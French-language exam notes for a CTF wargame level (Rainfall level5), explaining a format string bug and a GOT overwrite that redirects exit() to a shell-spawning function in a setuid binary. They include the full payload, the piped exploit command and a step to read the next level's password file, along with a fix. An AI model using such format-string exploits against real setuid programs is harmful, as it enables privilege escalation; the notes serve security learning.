# Level5 - Exam Notes

## 1. Objective
Obtenir un shell level6. Le binaire est setuid level6 ; `o()` exécute `system("/bin/sh")` mais n’est jamais appelée. Après printf, le programme appelle `exit(1)`.

## 2. Initial diagnosis (before GDB)
- **Fonctions suspectes :** `printf(buffer)` dans n() (format string), puis `exit(1)`. `o()` @ 0x080484a4 = system("/bin/sh"). Pas appelée.
- **Entrée utilisateur :** buffer lu par fgets, passé à printf.
- **Succès :** faire en sorte que l’appel à exit(1) redirige vers o() au lieu de la vraie exit. → Écraser la **GOT de exit** (0x8049838) par 0x080484a4.
- **Hypothèse :** format string pour écrire 0x080484a4 à la GOT de exit ; il faut l’index du buffer (ex. 4 sur Rainfall).

## 3. GDB diagnosis (how the vulnerability was found)
- **Où break :** après printf dans n(), avant l’appel à exit. But : vérifier que la GOT de exit a bien été écrasée et que le prochain call ira vers o().
- **GOT exit :** `x/wx 0x8049838` avant exploit → adresse dans la PLT/libc. Après exploit → doit valoir **0x080484a4** (o).
- **Index du buffer :** même méthode que level4 : "AAAA" + "%1$p" … "%5$p". Sur Rainfall le buffer est à l’**index 4** (0x41414141 affiché par %4$p). Donc on met l’adresse GOT (0x8049838) au début du buffer et on utilise %4$n.
- **Valeur à écrire :** 0x080484a4 = 134513828. Un seul %n : 4 (adresse) + 134513824 = 134513828. Payload : `\x38\x98\x04\x08` + "%134513824x" + "%4$n".
- **Contrôle du flux :** après printf, `x/wx 0x8049838` = 0x080484a4. Au call exit(1), le programme saute vers o() → system("/bin/sh"). Vérifier en ni après le call.

## 4. Building the exploit command
- **Cible :** GOT de exit à 0x8049838 ; valeur à écrire : 0x080484a4 (adresse de o).
- **Structure :** [4 octets = 0x8049838 LE] + "%134513824x" + "%4$n". Index 4 trouvé en GDB ; 4+134513824 = 134513828 = 0x080484a4.
- **Encodage :** `\x38\x98\x04\x08`. Python : `print "\x38\x98\x04\x08" + "%134513824x%4$n"`.
- **Invocation :** stdin ; garder le shell : `( python -c '...'; cat ) | ./level5`.
- **Référence commands.md :** section Exploitation. Commande finale avec %4$n ; si l’index diffère sur une autre VM, refaire le dump.

## 5. Exploitation logic
Format string dans n() ; après printf le code appelle exit(1). En écrasant l’entrée GOT de exit par l’adresse de o(), l’appel à exit résout vers o() → system("/bin/sh"). Hijack de la GOT, pas d’écriture de variable globale.

## 6. Reproducible procedure (for evaluation)
- **Commande :** `( python -c 'print "\x38\x98\x04\x08" + "%134513824x%4$n"'; cat ) | ./level5` puis `cat /home/user/level6/.pass`.
- **Résultat attendu :** shell level6 (peut prendre quelques secondes à cause du %134513824x).
- **À dire :** « Format string ; j’écrase la GOT de exit avec l’adresse de o(). L’index du buffer est 4 (trouvé avec AAAA + %k$p). Au lieu d’appeler exit, le programme appelle o() qui lance /bin/sh. »

## 7. Oral defense points
- **Bug :** printf(buffer) dans n(), avant exit(1).
- **GDB :** adresse de o 0x080484a4, GOT exit 0x8049838, index buffer 4 ; après exploit GOT = 0x080484a4.
- **Payload :** on n’écrit pas une variable mais la GOT de exit pour détourner l’appel vers o().
- **Fix :** printf("%s", buffer) ; compilation avec RELRO pour protéger la GOT.

## 8. Common evaluator questions
- **Pourquoi la GOT de exit ?** Juste après printf le programme appelle exit(1) ; en modifiant cette entrée on redirige vers o().
- **Que fait %4$n ?** Il écrit le nombre d’octets imprimés à l’adresse contenue dans le 4e argument (notre buffer avec 0x8049838).
- **Pourquoi 134513824 ?** 0x080484a4 = 134513828 ; on a déjà imprimé 4 octets, donc 134513828 - 4.
- **Alternative ?** Deux %hn (moitié basse/haute) pour éviter d’imprimer des millions de caractères ; une %n suffit ici.
